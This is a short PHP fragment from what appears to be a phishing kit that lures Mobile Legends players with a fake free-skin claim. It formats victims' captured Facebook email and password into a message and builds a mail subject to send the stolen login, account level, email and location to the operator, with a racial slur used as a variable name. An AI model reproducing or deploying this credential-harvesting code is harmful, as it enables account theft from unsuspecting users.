...
+++++ AKUN FACEBOOK ++++
Email Facebook: ".$fbemail."
Password Facebook: ".$fbpass."
+++++ AKUN FACEBOOK ++++
</br>
...
include 'email.php';
$subject = "ML VIRAL CLAIM SKIN | LOG BIND ACCOUNT ".$level." PUNYA SI ".$email." (".$negro.") (".$alamat.")";
